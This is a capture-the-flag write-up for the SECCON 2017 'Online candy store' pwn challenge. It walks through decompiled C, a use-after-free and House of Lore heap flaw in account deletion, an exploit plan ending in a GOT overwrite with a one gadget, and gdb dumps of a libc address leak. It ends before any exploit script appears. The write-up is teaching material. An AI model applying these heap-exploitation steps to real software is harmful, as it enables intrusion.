---
title: "Online candy store"
sidebar_position: 1
---


## **Information**

### **Description**
```
I have opened an online candy store.

Host : [lazenca0x0.pwn.seccon.jp](http://lazenca0x0.pwn.seccon.jp)  
Port : 9999  
[Lazenca.0x0-9374845c01384f5fc9efdce81437697499640db78523509906f315a1bed5cb3d.zip](https://files-quals.seccon.jp/Lazenca.0x0-9374845c01384f5fc9efdce81437697499640db78523509906f315a1bed5cb3d.zip) (pass:seccon2017)
```
### **File**

* [Lazenca.0x0-9374845c01384f5fc9efdce81437697499640db78523509906f315a1bed5cb3d.zip](/attachments/11501728/12189741.zip)

### **Source Code**

## **Writeup**

### File information

```bash title="File information"
lazenca0x0@ubuntu:~/Documents/CTF/SECCON2017$ file ./Lazenca.0x0 
./Lazenca.0x0: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=1bfd795acede916210985e5865d2de9697e7505a, stripped
lazenca0x0@ubuntu:~/Documents/CTF/SECCON2017$ checksec.sh --file ./Lazenca.0x0 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   ./Lazenca.0x0
lazenca0x0@ubuntu:~/Documents/CTF/SECCON2017$
```

### **Binary analysis (Finding vulnerabilities)**

#### **Main**

* **The function has the following functions.**
  + This function sets Candy information by calling the setCandy() function.
  + This function calls the login() function to check account information.
  + The function operates as follows if the user fails to log in.  
    - That function asks the user if they want to create an account if login fails.
      * This function creates a new account using the addAccount() function.
    - And if the function fails to log in three times, the program ends.
  + This function can use the functions below when the user successfully logs in.  
    - Inventory output, ordering, charging, logout
    - If the value of gLoginAccount→state is 1, you can use the “orderMenu” and “Account” functions.

```c title="main"
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  signed int state; // [rsp+4h] [rbp-Ch]

  state = 1;
  signal(14, handler);
  alarm(0x1Eu);
  title();
  setCandy();
  gOrderCnt = 0;
  gLoginFailCnt = 0;
  while ( !gLoginAccount )
  {
    if ( (unsigned int)login() )
    {
      gLoginFailCnt = 0;
LABEL_14:
      while ( state && gLoginAccount )
      {
        Menu();
        printf("Command : ");
        switch ( (unsigned int)retNumber(2LL) )
        {
          case 0u:
            state = 0;
            break;
          case 1u:
            printStock();
            break;
          case 2u:
            purchase();
            break;
          case 3u:
            charge();
            break;
          case 4u:
            if ( gLoginAccount->state == 1 )
              orderMenu();
            break;
          case 5u:
            if ( gLoginAccount->state == 1 )
              Account();
            break;
          case 9u:
            logout(2LL);
            break;
          default:
            goto LABEL_14;
        }
      }
    }
    else
    {
      if ( gLoginFailCnt == 2 )
        exit(1);
      ++gLoginFailCnt;
      puts("\nCreate an account?");
      puts("0) Yes\n1) No");
      if ( !(unsigned int)retNumber(2LL) )
        addAccount(3LL);
    }
  }
  return 0LL;
}
```

#### **login()**

* ****The function has the following functions.****
  + This function receives ID and password input from the user.
  + This function checks whether the input value exists in the global variable gAccount[].
  + If authentication is successful, this function stores the address of gAccount[] where the account information is stored in the global variable "gLoginAccount".

```c title="login"
signed __int64 login()
{
  size_t lenUserInputID; // rbx
  size_t lenID; // rax
  size_t lenUserInputPW; // rbx
  size_t lenPW; // rax
  signed int i; // [rsp+Ch] [rbp-34h]
  char id[8]; // [rsp+10h] [rbp-30h]
  char pw[8]; // [rsp+20h] [rbp-20h]
  unsigned __int64 v8; // [rsp+28h] [rbp-18h]

  v8 = __readfsqword(0x28u);
  memset(id, 0, 8uLL);
  memset(pw, 0, 8uLL);
  printf("\nEnter your ID.\n> ", 0LL);
  UserInput(id, 8LL);
  printf("Enter your Password.\n> ", 8LL);
  UserInput(pw, 8LL);
  for ( i = 0; i <= 2; ++i )
  {
    if ( gAccount[i].state )
    {
      lenUserInputID = strlen(id);
      if ( lenUserInputID == strlen(gAccount[i].fd->id) )
      {
        lenID = strlen(gAccount[i].fd->id);
        if ( !strncmp(gAccount[i].fd->id, id, lenID) )
        {
          lenUserInputPW = strlen(pw);
          if ( lenUserInputPW == strlen(gAccount[i].fd->pw) )
          {
            lenPW = strlen(gAccount[i].fd->pw);
            if ( !strncmp(gAccount[i].fd->pw, pw, lenPW) )
            {
              gLoginAccount = (struct ACCOUNT *)(32LL * i + 0x604220);
              printf("\nHi, %s", gAccount[i].fd->id);
              return 1LL;
            }
          }
        }
      }
    }
  }
  return 0LL;
}
```

* **The function uses the following structure.**

```c title="struct IDPW and struct ACCOUNT"
struct IDPW{
    long empty[2];
    char id[8];
    char pw[8];
    long state;
    char description[88];
};

struct ACCOUNT{
    long state;
    long number;
    struct IDPW *fd;
    long bk;
};
```

#### **addAccount()**

* **The function has the following functions.**
  + The function operates as follows when the value of the global variable gAccount[].state is '0'.
    - The function uses malloc() to allocate 128 bytes of heap space.
      * The function stores the address of the area in gAccount[i].fd.
      * The function stores ID, password, and profile information in the corresponding area.

```c title="addAccount"
unsigned __int64 __fastcall addAccount(unsigned int a1)
{
  unsigned int i; // [rsp+10h] [rbp-10h]
  signed int empty; // [rsp+14h] [rbp-Ch]
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  empty = 1;
  for ( i = 0; i <= 2 && empty; ++i )
  {
    if ( !gAccount[i].state )
    {
      empty = 0;
      gAccount[i].state = a1;
      gAccount[i].number = i + 1;
      gAccount[i].fd = (struct IDPW *)malloc(128uLL);
      gAccount[i].fd->state = 1LL;
      puts("\nEnter your New ID.");
      UserInput(gAccount[i].fd->id, 8LL);
      puts("Enter your New Password.");
      UserInput(gAccount[i].fd->pw, 8LL);
      puts("Enter your profile.");
      UserInput(gAccount[i].fd->description, 88LL);
      gAccount[i].bk = 10000LL;
    }
  }
  if ( empty )
    puts("Could not add user.");
  return __readfsqword(0x28u) ^ v4;
}
```

#### **purchase**

* **The function has the following functions.**
  + If the value of the global variable gStockCnt is 0, the function outputs a message and ends the function.
  + This function performs the following functions if the value of the global variable gStockCnt is not 0.
    - This function receives the code number of the candy to be purchased (candyInfo[0]) and the number of candies (candyInfo[1]) from the user.
      * This function checks whether the candy code number and number of candies can be purchased.
    - This function will proceed with the normal purchase, and if the candy is out of stock, the function below will be called.  
      * reSortStock()
      * setBoard()

```c title="purchase"
unsigned __int64 purchase()
{
  unsigned int v0; // ST00_4
  unsigned int candyInfo[2]; // [rsp+0h] [rbp-10h]
  unsigned __int64 v3; // [rsp+8h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  if ( gStockCnt )
  {
    puts("Please enter the code number of the candy to be purchased.");
    candyInfo[0] = retNumber(3LL);
    if ( candyInfo[0] < gStockCnt )
    {
      puts("Please enter the number of the candy to purchase.");
      candyInfo[1] = retNumber(3LL);
      if ( gStock[candyInfo[0]]->candyNumber < candyInfo[1] )
      {
        if ( gStock[candyInfo[0]]->candyNumber < candyInfo[1] )
          puts("There is not enough stock.");
      }
      else if ( candyInfo[1] * gStock[candyInfo[0]]->candyPrice > gLoginAccount->bk )
      {
        printf(
          "You do not have enough money.(%ld)\n",
          candyInfo[1] * gStock[candyInfo[0]]->candyPrice,
          *(_QWORD *)candyInfo);
      }
      else
      {
        gStock[candyInfo[0]]->candyNumber -= candyInfo[1];
        if ( !gStock[candyInfo[0]]->candyNumber )
        {
          printf(
            "Thank you for your purchase.(%ld)\n",
            candyInfo[1] * gStock[candyInfo[0]]->candyPrice,
            *(_QWORD *)candyInfo);
          reSortStock(v0);
          setBoard();
        }
      }
    }
  }
  else
  {
    puts("We have not any candy.");
  }
  return __readfsqword(0x28u) ^ v3;
}
```

* **Use the following structure.**

```c title="struct STOCK"
struct STOCK{
    char candyName[8];
    unsigned int  candyNumber;
    unsigned int  candyPrice;
    char *candyDescription;
};
```

#### **setBoard()**

* **The function has the following functions.**
  + This function allocates 1200 bytes of heap space using the malloc() function.
  + This function receives the value input from the user and stores it in the corresponding area.

```c title="setBoard"
unsigned __int64 setBoard()
{
  unsigned __int64 v0; // ST08_8

  v0 = __readfsqword(0x28u);
  puts("Please enter a comment for candy.");
  board = (__int64)malloc(1200uLL);
  UserInput(board, 1200LL);
  return __readfsqword(0x28u) ^ v0;
}
```

#### **charge**
* ****The function has the following functions.****
  + This function receives the number of the amount to be charged from the user.
  + The function adds the amount to the “gLoginAccount→bk” area.

```c title="charge"
unsigned __int64 charge()
{
  unsigned int chargeInfo[2]; // [rsp+0h] [rbp-10h]
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  chargeInfo[0] = 0;
  puts("Please select the amount to charge.");
  puts("0) 1");
  puts("1) 10");
  puts("2) 100");
  puts("3) 1000");
  puts("4) 10000");
  puts("5) 100000");
  chargeInfo[1] = retNumber(2LL);
  switch ( chargeInfo[1] )
  {
    case 0u:
      chargeInfo[0] = 1;
      break;
    case 1u:
      chargeInfo[0] = 10;
      break;
    case 2u:
      chargeInfo[0] = 100;
      break;
    case 3u:
      chargeInfo[0] = 1000;
      break;
    case 4u:
      chargeInfo[0] = 10000;
      break;
    case 5u:
      chargeInfo[0] = 100000;
      break;
    default:
      break;
  }
  gLoginAccount->bk += chargeInfo[0];
  printf("%ld yen charged.\n", chargeInfo[0], *(_QWORD *)chargeInfo);
  return __readfsqword(0x28u) ^ v2;
}
```

#### **Account()**

* **This function is available when the value of gLoginAccount->state is 1.**
* ****The function has the following functions.****
  + The function prints a list of available features.
    - Delete account, change password
  + This function receives the number of the function to be used from the user and calls the function.

```c title="Account"
unsigned __int64 Account()
{
  int tmp; // eax
  signed int i; // [rsp+8h] [rbp-58h]
  signed int control; // [rsp+Ch] [rbp-54h]
  char funcList[3][22]; // [rsp+10h] [rbp-50h]
  unsigned __int64 v5; // [rsp+58h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  control = 1;
  strcpy((char *)funcList, "Delete account");
  *(_DWORD *)&funcList[0][16] = 0;
  *(_WORD *)&funcList[0][20] = 0;
  strcpy(funcList[1], "Change password");
  *(_DWORD *)&funcList[1][16] = 0;
  *(_WORD *)&funcList[1][20] = 0;
  *(_OWORD *)&funcList[2][0] = (unsigned __int64)'tixE';
  *(_DWORD *)&funcList[2][16] = 0;
  *(_WORD *)&funcList[2][20] = 0;
  while ( control )
  {
    puts("\nAccount.");
    for ( i = 0; i <= 2; ++i )
      printf("%d) %s\n", (unsigned int)(i + 1), funcList[i]);
    printf("Command : ");
    tmp = retNumber(2LL);
    switch ( tmp )
    {
      case 2:
        changePW();
        break;
      case 3:
        control = 0;
        break;
      case 1:
        delAccount();
        break;
    }
  }
  return __readfsqword(0x28u) ^ v5;
}
```

#### **delAccount()**

* **The function has the following functions.**
  + This function uses the global variable gAccount[] to output accounts that can be deleted.
  + This function receives the number of the account to be deleted from the user.
  + This function deletes the account selected by the user if the state information is '3'.
  - This function initializes the information of the account (gAccount[num]).
    * state = 0
    * fd→state = 0
    * memset(gAccount[num].fd, 0, 0x80uLL);
  - This function releases the fd area (heap) of the account (gAccount[num]). + The function stores the value calculated by calculating "gAccount[num].fd - 16" in the gAccount[num].fd area.
    - The saved value is the head address of the free chunk.
    - **This creates The House of Lore, UAF vulnerability.**

```c title="delAccount"
unsigned __int64 delAccount()
{
  unsigned int i; // [rsp+8h] [rbp-18h]
  unsigned int num; // [rsp+Ch] [rbp-14h] MAPDST
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  puts("\nAccount list");
  for ( i = 0; i <= 2; ++i )
  {
    if ( gAccount[i].state )
      printf("%d) %s\n", gAccount[i].number, gAccount[i].fd->id);
  }
  puts("\nPlease enter the number of the account you want to delete");
  num = retNumber(2LL);
  if ( num && num <= 3 )
  {
    if ( gAccount[--num].state == 3 )
    {
      gAccount[num].state = 0LL;
      gAccount[num].fd->state = 0LL;
      printf("The account(%s) has been deleted.\n", gAccount[num].fd->id);
      memset(gAccount[num].fd, 0, 0x80uLL);
      free(gAccount[num].fd);
      gAccount[num].fd = (struct IDPW *)((char *)gAccount[num].fd - 16);
    }
    else
    {
      puts("You can not delete the account.");
    }
  }
  return __readfsqword(0x28u) ^ v4;
}
```

#### **changePW**

* **The function has the following functions.**
  + This function uses the global variable “gAccount[i].state” to output accounts whose passwords can be changed.
  + This function receives the account number for which the password will be changed from the user.
  + This function can change the password if the value stored in the 'gAccount[].fd.state' area of ​​the account is not '0'.

```c title="changePW"
unsigned __int64 changePW()
{
  unsigned int i; // [rsp+8h] [rbp-18h]
  unsigned int num; // [rsp+Ch] [rbp-14h] MAPDST
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  puts("\nAccount list");
  for ( i = 0; i <= 2; ++i )
  {
    if ( gAccount[i].state )
      printf("%ld) %s\n", gAccount[i].number, gAccount[i].fd->id);
  }
  puts("\nPlease enter the number of the account you want to change PW");
  num = retNumber(2LL);
  if ( num )
  {
    if ( num <= 3 )
    {
      if ( gAccount[--num].fd )
      {
        if ( gAccount[num].fd->state )
        {
          puts("Enter your New Password.");
          UserInput(gAccount[num].fd->pw, 8LL);
        }
      }
    }
  }
  return __readfsqword(0x28u) ^ v4;
}
```

#### **orderMenu()**

* **This function is available when the value of gLoginAccount->state is 1.**
* **The function has the following functions.**
  + The function prints a list of available features.
    - Order list, add to order list, cancel order list, order candy
  + This function receives the number of the function to be used from the user and calls the function.

```c title="orderMenu"
unsigned __int64 orderMenu()
{
  signed int i; // [rsp+8h] [rbp-88h]
  unsigned int control; // [rsp+Ch] [rbp-84h]
  char funcList[5][22]; // [rsp+10h] [rbp-80h]
  unsigned __int64 v4; // [rsp+88h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  control = 1;
  strcpy((char *)funcList, "Order List");
  *(_DWORD *)&funcList[0][16] = 0;
  *(_WORD *)&funcList[0][20] = 0;
  strcpy(funcList[1], "Add to Order List");
  *(_WORD *)&funcList[1][20] = 0;
  *(_QWORD *)&funcList[2][0] = 'o lecnaC';
  *(_QWORD *)&funcList[2][8] = 'o s���en';
  *(_DWORD *)&funcList[2][16] = 'redr';
  *(_WORD *)&funcList[2][20] = '.';
  strcpy(funcList[3], "Order candy");
  *(_DWORD *)&funcList[3][16] = 0;
  *(_WORD *)&funcList[3][20] = 0;
  *(_OWORD *)&funcList[4][0] = (unsigned __int64)'tixE';
  *(_DWORD *)&funcList[4][16] = 0;
  *(_WORD *)&funcList[4][20] = 0;
LABEL_11:
  while ( control )
  {
    puts("\nOrder candy.");
    for ( i = 0; i <= 4; ++i )
      printf("%d) %s\n", (unsigned int)(i + 1), funcList[i]);
    printf("Command : ");
    switch ( (unsigned int)retNumber(2LL) )
    {
      case 1u:
        orderList();
        break;
      case 2u:
        addToOrderList();
        break;
      case 3u:
        orderCancel();
        break;
      case 4u:
        orderCandy();
        break;
      case 5u:
        control = 0;
        break;
      default:
        goto LABEL_11;
    }
  }
  return __readfsqword(0x28u) ^ v4;
}
```

#### **addToOrderList**

* **The function has the following functions.**
  + This function uses the choiceCandy() function to input the number of the candy to order.
  + This function allocates 24 bytes of heap space using the malloc() function.
    - This function stores information about the candy to be ordered in that area.

```c title="addToOrderList"
unsigned __int64 addToOrderList()
{
  struct ORDER *newOrder; // ST08_8
  unsigned int tmp; // eax
  unsigned int candyNum; // [rsp+4h] [rbp-1Ch]
  char strOrdNum[8]; // [rsp+10h] [rbp-10h]
  unsigned __int64 v5; // [rsp+18h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  if ( (unsigned int)gOrderCnt > 9 )
  {
    puts("You can not order candy anymore.");
  }
  else
  {
    candyNum = choiceCandy();
    if ( candyNum > 9 )
    {
      puts("Please enter a number between 0 and 9");
    }
    else
    {
      newOrder = (struct ORDER *)malloc(24uLL);
      tmp = getOrderNum();
      sprintf(strOrdNum, "%d", tmp);
      strncpy(newOrder->orderCode, strOrdNum, 1uLL);
      newOrder->orderNumber = gCandies[candyNum]->orderNumber;
      strncpy(newOrder->orderCandyName, gCandies[candyNum]->candyName, 8uLL);
      newOrder->candyCode = gCandies[candyNum]->candyCode;
      gOrderList[gOrderCnt++] = newOrder;
      orderList();
    }
  }
  return __readfsqword(0x28u) ^ v5;
}
```

* **Use the following structure.**

```c title="struct ORDER and struct CANDIES"
typedef struct ORDER{
    char orderCode[8];
    unsigned int  orderNumber;
    char orderCandyName[8];
    int  candyCode;
};

typedef struct CANDIES {
    char candyName[8];
    unsigned int  orderNumber;
    int candyCode;
};
```

#### **orderCancel**

* **The function has the following functions.**
  + This function uses the checkCancel(i) function to check orders that can be canceled and outputs a list of orders that can be cancelled.
  + This function has a cancelable order and receives the order number from the user.
  + The function verifies the input value and then calls the reSort() function to cancel the order.

```c title="orderCancel"
unsigned __int64 orderCancel()
{
  unsigned int i; // [rsp+Ch] [rbp-44h]
  int j; // [rsp+Ch] [rbp-44h]
  int orderCnt; // [rsp+10h] [rbp-40h]
  unsigned int canNum; // [rsp+1Ch] [rbp-34h]
  int cancelableList[10]; // [rsp+20h] [rbp-30h]
  unsigned __int64 v6; // [rsp+48h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  orderCnt = 0;
  if ( gOrderCnt )
  {
    for ( i = 0; i < gOrderCnt; ++i )
    {
      if ( (unsigned int)checkCancel(i) )
      {
        cancelableList[orderCnt++] = i;
        printf("\n=*= Cancelable order (Order number : %d) =*=\n", i);
        printf("Order code: %s\n", gOrderList[i]);
        printf("Order count : %d\n", gOrderList[i]->orderNumber);
        printf("Order candy : %s\n", gOrderList[i]->orderCandyName);
        printf("Candy code: %d\n", (unsigned int)gOrderList[i]->candyCode);
      }
    }
    if ( orderCnt )
    {
      canNum = retNumber(2LL);
      for ( j = 0; j < orderCnt; ++j )
      {
        if ( cancelableList[j] == canNum )
          reSort(canNum);
      }
    }
  }
  else
  {
    puts("You have never ordered a product.");
  }
  return __readfsqword(0x28u) ^ v6;
}
```

#### **reSort**

* ****The function has the following functions.****
  + This function releases the gOrderList[a1] area using the free() function.

```c title="reSort"
unsigned __int64 __fastcall reSort(unsigned int a1)
{
  int i; // [rsp+14h] [rbp-Ch]
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  free(gOrderList[a1]);
  if ( a1 < gOrderCnt )
  {
    for ( i = 0; a1 + i < gOrderCnt; ++i )
      gOrderList[a1 + i] = gOrderList[a1 + i + 1];
  }
  gOrderList[gOrderCnt--] = 0LL;
  return __readfsqword(0x28u) ^ v3;
}
```

#### **orderCandy()**

* **The function has the following functions.**
  + This function checks whether the candy order from the user has been processed.
  + This function uses the getStockNum() function to check whether the value stored in gOrderList[] exists in gStock[].
    - If the function exists in the value stored in gOrderList[] and gStock[], it is processed as follows.
      * The value of “gOrderList[]->orderNumber” is added to “gStock[]->candyNumber”.
    - If the function does not exist in the value stored in gOrderList[] and gStock[], it is processed as follows.
      * This function allocates 24 bytes of heap space using the malloc() function.
      * The function stores information about the candy in that area.
        + Address value where candy name, price, and candy information are stored
      * And the function allocates a heap area of ​​124 bytes and stores the candy information entered by the user in that area.
  + The function stores all the values ​​stored in gOrderList[] in gStock[] and then releases all gOrderList[] areas.

```c title="orderCandy"
unsigned __int64 orderCandy()
{
  struct STOCK *dest; // ST10_8
  unsigned int i; // [rsp+4h] [rbp-1Ch]
  int num; // [rsp+Ch] [rbp-14h]
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  if ( gOrderCnt )
  {
    orderList();
    puts("\nWould you like to order these candies?");
    puts("0) Yes, 1) No");
    if ( !(unsigned int)retNumber(2LL) )
    {
      for ( i = 0; i < gOrderCnt; ++i )
      {
        num = getStockNum(i);
        if ( num )
        {
          gStock[num - 1]->candyNumber += gOrderList[i]->orderNumber;
        }
        else if ( (unsigned int)gStockCnt > 4 )
        {
          puts("The warehouse is full. Your new order can not be completed.");
        }
        else
        {
          puts("\nEnter information about newly added candy.");
          dest = (struct STOCK *)malloc(24uLL);
          strncpy(dest->candyName, gOrderList[i]->orderCandyName, 8uLL);
          dest->candyNumber = gOrderList[i]->orderNumber;
          printf("Enter the price of %s candy.\n", dest);
          dest->candyPrice = retNumber(5LL);
          printf("Enter a description of the %s candy.\n", dest);
          dest->candyDescription = (char *)malloc(124uLL);
          UserInput(dest->candyDescription, 124LL);
          gStock[gStockCnt++] = dest;
        }
      }
      while ( gOrderCnt )
      {
        free(gOrderList[gOrderCnt - 1]);
        gOrderList[gOrderCnt-- - 1] = 0LL;
      }
    }
  }
  else
  {
    puts("You have never ordered a product.");
  }
  return __readfsqword(0x28u) ^ v4;
}
```

### **Proof of concept**

* Before proceeding with the explanation, the tester wanted players to use the "House of lore" vulnerability to solve it.
  + However, in addition to these vulnerabilities, attacks are possible in many other forms.

#### **Fake chunk**

* **An understanding of the ACCOUNT structure is required to understand vulnerabilities in the program.**
  + The structure is declared as a global variable.
  + The program uses three ACCOUNT structures.
    - The first structure stores 'Admin' account information.
    - The 2nd and 3rd structures store information about the account created by the user.

:::note[struct ACCOUNT gAccount]
|  |  |  |
| --- | --- | --- |
| 0x604220 | Admin.state | Admin.number |
| 0x604230 | Admin.fd | Admin.bk |
| 0x604240 | gAccount[1].state | gAccount[1].number |
| 0x604250 | gAccount[1].fd | gAccount[1].bk |
| 0x604260 | gAccount[2].state | gAccount[2].number |
| 0x604270 | gAccount[2].fd | gAccount[2].bk |
:::

* **House of lore vulnerability requires the following Fake chunk.**
  + You can use the delAccount() function to store the head address of the free chunk in the gAccount[1].fd area.
  + You can change the values ​​of the gAccount[1].bk and gAccount[2].bk areas using the charge() function.

:::note[Fake chunk]
|  |  |  |
| --- | --- | --- |
| 0x604220 | Admin.state | Admin.number |
| 0x604230 | Admin.fd | Admin.bk |
| 0x604240 | gAccount[1].state | gAccount[1].number |
| 0x604250 | gAccount[1].fd = Free chunk head | gAccount[1].bk = 0x604268 |
| 0x604260 | gAccount[2].state | gAccount[2].number |
| 0x604270 | gAccount[2].fd | gAccount[2].bk = 0x604240 |
:::

#### **Overwrite Fd of Fack chunk**

* **House of lore vulnerability must be able to change the fd area of ​​the following free chunk.**  
  + The value of the gAccount[1].fd area is changed by the delAccount() function.  
    - gAccount[1].fd→id: fd area
    - gAccount[1].fd→pw: bk area
  + If you can change the password for the account, you can overwrite the value in the bk area of ​​the free chunk.
* **However, in order to change the password, the value of "gAccount[1].fd→state" must not be '0'.**

:::note[gAccount[1].fd]
|  | Create an account | | Delete account | |
| --- | --- | --- | --- | --- |
| gAccount[1].fd | 0x8 | | 0x0 | |
| 0x0 | prev\_size | Size of chunk | **Chunk** (long empty[0]) | **Chunk size** (long empty[0]) |
| 0x10 | long empty[0] | long empty[1] | **fd** (char id[8]) | **bk** (char pw[8]) |
| 0x20 | char id[8] | char pw[8] | long state | char description[88] |
| 0x30 | long state | char description[88] |  |  |
:::

#### **UAF**

* **You can change the value of "gAccount[1].fd→state" using a UAF vulnerability as follows:**
  + The size of the ACCOUNT structure is 128 bytes.
  + The size allocated to dest->candyDescription (area where you enter candy information) in the orderCandy() function is 124 bytes.
  + The released "gAccount[1].fd" area must be allocated to "dest→candyDescription".
    - If you save more than 16 characters in the area ("dest→candyDescription"), the "gAccount[1].fd→state" area can be overwritten.
* **Something to note:**
  + **The most important part of a UAF attack is to be able to allocate and deallocate a space of the same size as the ACCOUNT structure for a house of lore attack.**
    - In other words, the area allocated to "dest->candyDescription" must be assigned to the freed "gAccount[1].fd" area.
  + ****And be careful not to assign the following areas to the “gAccount[1].fd” area.****
    - In order to order candy, you must add the candy to be purchased to the order list.
      * Heap area (24 bytes) is allocated each time a candy to be purchased is added to the order list.
    - The program is allocated a heap area (24 bytes) if the ordered candy is not available in the store.

### Structure of Exploit code
:::note
1. Leak Libc Addresss
2. Design the heap.  
   1. Create account 1
   2. Create account 2
3. UAF
   1. Set gAccount[1].fd→state
4. House of lore
   1. register bins[16,17]
   2. Overwrite Smallbin bk
5. Overwrite gAccount[1].fd  
   1. signal GOT
6. Overwrite fflush.got
   1. One Gadget
:::

* The following information is required for an attack:

:::note 
* Leak Libc Addresss
* House of lore
* One Gadget
:::

### **Information for attack**

#### **Leak Libc Addresss**

* **The following heap structure design is required.**
  + The user adds one candy to the order list and completes the order.
  + The user adds 2 candies to the order list.

```bash title="Heap Layout"
gdb-peda$ parseheap 
addr                prev                size                 status              fd                bk                
0xa17000            0x0                 0x90                 Used                None              None
0xa17090            0x0                 0x410                Used                None              None
0xa174a0            0x0                 0x20                 Used                None              None
0xa174c0            0x0                 0x20                 Used                None              None
0xa174e0            0x0                 0x20                 Used                None              None
0xa17500            0x0                 0x20                 Used                None              None
0xa17520            0x0                 0x20                 Used                None              None
0xa17540            0x0                 0x20                 Used                None              None
0xa17560            0x0                 0x20                 Used                None              None
0xa17580            0x0                 0x20                 Used                None              None
0xa175a0            0x0                 0x20                 Used                None              None
0xa175c0            0x0                 0x20                 Used                None              None
0xa175e0            0x0                 0x20                 Used                None              None
0xa17600            0x100006567         0x20                 Used                None              None
0xa17620            0xa17630            0x90                 Used                None              None
0xa176b0            0x0                 0x20                 Used                None              None
gdb-peda$
```

* **Heap structure is as follows.**

|  | Addresss | State | Heap size | fd | bk |
| --- | --- | --- | --- | --- | --- |
| Order list[0] | 0xa175e0 | A | 0x20 | None | None |
| Candy information stored in warehouse | 0xa17600 | A | 0x20 | None | None |
| Description of candy stored in warehouse | 0xa17620 | A | 0x90 | None | None |
| Order list[1] | 0xa176b0 | A | 0x20 | None | None |

* **Register the freed heap area to small bin in the following way.**
  + The user purchases all the candy initially registered.
  - When the program uses up all the candy, it releases all the heap area it was using.
    * The candy description (0x90) area is registered in Unsortedbin.
      + At this time, the address value of the main arena is stored in fd and bk.
  - And the program allocates a heap area to store evaluations of all candies that have been used up.
  * malloc() changes the released candy information (0x20) area and candy description (0x90) area into one area (0xb0).
  * malloc() allocates a heap area (1200 bytes) and stores that area in the small bin.
  + The address of the small bin is stored in the fd,bk area of ​​the corresponding free chunk.

```bash title="debugging"
gdb-peda$ parseheap 
addr                prev                size                 status              fd                bk                
0xa17000            0x0                 0x90                 Used                None              None
0xa17090            0x0                 0x410                Used                None              None
0xa174a0            0x0                 0x20                 Used                None              None
0xa174c0            0x0                 0x20                 Used                None              None
0xa174e0            0x0                 0x20                 Used                None              None
0xa17500            0x0                 0x20                 Used                None              None
0xa17520            0x0                 0x20                 Used                None              None
0xa17540            0x0                 0x20                 Used                None              None
0xa17560            0x0                 0x20                 Used                None              None
0xa17580            0x0                 0x20                 Used                None              None
0xa175a0            0x0                 0x20                 Used                None              None
0xa175c0            0x0                 0x20                 Used                None              None
0xa175e0            0x0                 0x20                 Used                None              None
0xa17600            0x100006567         0xb0                 Freed     0x7ff5052a2c18    0x7ff5052a2c18
0xa176b0            0xb0                0x20                 Used                None              None
0xa176d0            0x100006567         0x4c0                Used                None              None
gdb-peda$ p main_arena.bins[20]
$6 = (mchunkptr) 0xa17600
gdb-peda$ p main_arena.bins[21]
$7 = (mchunkptr) 0xa17600
gdb-peda$
```

* **Heap structure is as follows.**

|  | Addresss | State | Heap size | fd | bk |
| --- | --- | --- | --- | --- | --- |
| Order list[0] | 0xa175e0 | A | 0x20 | None | None |
| Description of candies & candies stored in the warehouse | 0xa17600 | F | 0xb0 | 0x7ff5052a2c18 | 0x7ff5052a2c18 |
| Order list[1] | 0xa176b0 | A | 0x20 | None | None |
| Evaluate purchased candy | 0xa176d0 | A | 0x4c0 | None | None |

* **You can extract Libc addresses in the following way.**
  + The user adds one candy to the order list.  
    - Information on candy added to the order list is allocated to the change area as one area (0xb0).
  + Users can print the contents of the Order list and extract Libc addresses.

```bash title="Leak Libc address"
Please pick up the candies to order.
>$ 1

=*= Order list =*=
Order code  : 4
Order count : 10
Order candy : Orange
Candy code  : 1

Order code  : 5
Order count : 10
Order candy : Orange
Candy code  : 1

Order code  : 6L\xb0\x0c\x85\x7f
Order count : 10
Order candy : Orange
Candy code  : 1

Order candy.
1) Order List
2) Add to Order List
3) Cancel one's order.
4) Order candy
5) Exit
Command : $
```

```bash title="Leak Libc address - debugging"
gdb-peda$ parseheap 
addr                prev                size                 status              fd                bk                
0xa17000            0x0                 0x90                 Used                None              None
0xa17090            0x0                 0x410                Used                None              None
0xa174a0            0x0                 0x20                 Used                None              None
0xa174c0            0x0                 0x20                 Used                None              None
0xa174e0            0x0                 0x20                 Used                None              None
0xa17500            0x0                 0x20                 Used                None              None
0xa17520            0x0                 0x20                 Used                None              None
0xa17540            0x0                 0x20                 Used                None              None
0xa17560            0x0                 0x20                 Used                None              None
0xa17580            0x0                 0x20                 Used                None              None
0xa175a0            0x0                 0x20                 Used                None              None
0xa175c0            0x0                 0x20                 Used                None              None
0xa175e0            0x0                 0x20                 Used                None              None
0xa17600            0x100006567         0x20                 Used     			 None    		   None
0xa17620            0x100006567         0x90                 Freed     0x7ff5052a2c18    0x7ff5052a2c18
0xa176b0            0x90                0x20                 Used                None              None
0xa176d0            0x100006567         0x4c0                Used                None              None
gdb-peda$ x/4gx 0xa17600
0xa17600:	0x0000000100006567	0x0000000000000021
0xa17610:	0x00007ff5052a2c36	0x6e61724f0000000a
gdb-peda$
```

* **Heap structure is as follows.**

|  | Addresss | State | Heap size | fd | bk |
| --- | --- | --- | --- | --- | --- |
| Order list[0] | 0xa175e0 | A | 0x20 | None | None |
| Order list[2] | 0xa17600 | A | 0x20 | None | None |
| Description of candies & candies stored in the warehouse (Unsorted bin) | 0xa17620 | F | 0x90 | 0x7ff5052a2c18 | 0x7ff5052a2c18 |
| Order list[1] | 0xa176b0 | A | 0x20 | None | None |
| Evaluate purchased candy | 0xa176d0 | A | 0x4c0 | None | None |

* **You can extract Libc addresses using the following script.**

